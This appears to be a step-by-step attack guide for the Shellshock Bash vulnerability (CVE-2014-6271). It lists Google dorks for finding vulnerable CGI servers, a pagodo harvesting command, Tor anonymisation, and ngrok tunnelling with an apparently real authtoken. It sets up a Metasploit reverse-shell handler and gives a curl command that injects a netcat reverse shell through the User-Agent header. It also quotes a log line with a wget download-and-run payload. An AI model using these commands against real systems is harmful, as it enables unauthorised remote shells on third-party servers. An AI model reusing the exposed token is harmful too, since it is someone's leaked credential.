SHELLSHOCK VULNERABILITY CVE 2014-6271
ANATOMY OF THE ATTACK
Test your environment
env 'VAR=() { :;}; echo Bash is vulnerable!' 'FUNCTION()=() { :;}; echo Bash is vulnerable!' bash -c "echo Bash Test"

Can I detect if someone has exploited this against me?
192.168.1.1 – – [25/Sep/2014:14:00:00 +0000] "GET / HTTP/1.0"  400 349 "() { :; }; wget -O /tmp/besh http://192.168.1.1/filename; chmod 777  /tmp/besh; /tmp/besh;"

https://github.com/opsxcq/exploit-CVE-2014-6271

FIND POTENTIAL TARGETS
sitemap.xml filetype:xml intext:"cgi-bin"
filetype:sh inurl:cgi-bin
filetype:sh
intext:cgi-bin
intitle:apache "cgi-bin"
inurl:cgi-bin
inurl:wspd_cgi.sh
inurl:wslb.sh
inurl:"server-status" intitle:apache "cgi-bin"
inurl:cgi-bin "GATEWAY_INTERFACE = CGI"
inurl:cgi-bin inurl:printenv intext:SERVER_ADDR

# Save your dorks list into a file such as "dorks.txt"
# Specify the output path and filename such as "urls.txt"

$ sudo python pagodo.py ­-g dorks.txt ­-l 200 ­-s ­-e 35.0 -­j 1.1 >> urls.txt
https://github.com/opsdisk/pagodo

INITIALIZE TOR SESSION
# Type the below commands
$ sudo torphantom start ­-i <interface>

Scan using Shellshock-Scanner

# Type the below commands and follow up the screen prompt
$ ./shellshock-scanner

INITIALIZE TCP TUNNELING
Start Ngrok

# Your Token can be found in your Ngrok account
$ ./ngrok authtoken 8ml78jQFrVNah4cN8UwTt_5ZVZYRPD8q7huTk7vo8MZ
Create the Session

# Create the Ngrok session on the port 4444 using the below command
$ ./ngrok tcp 4444

Start Metasploit

# Open Metasploit
$ msfconsole
msf > use exploit/multi/handler
msf exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > set PAYLOAD linux/x86/shell/reverse_tcp
PAYLOAD => linux/x86/shell/reverse_tcp
msf exploit(multi/handler) > show options

EXPLOIT THE TARGET
Bash Command

# Replace "YOUR-IP" with your tunnel IP or host adddress
# Replace "YOUR-PORT" with the port you configured in your tunneling
$ curl -k -H 'User-Agent: () { :;}; /bin/bash -c "nc YOUR-IP YOUR-PORT -e /bin/sh"' https://example.com/cgi-bin/wspd_cgi.sh/login.htm

# Replace "4444" with the port you configured in your tunneling
$ nc -lvnp 4444
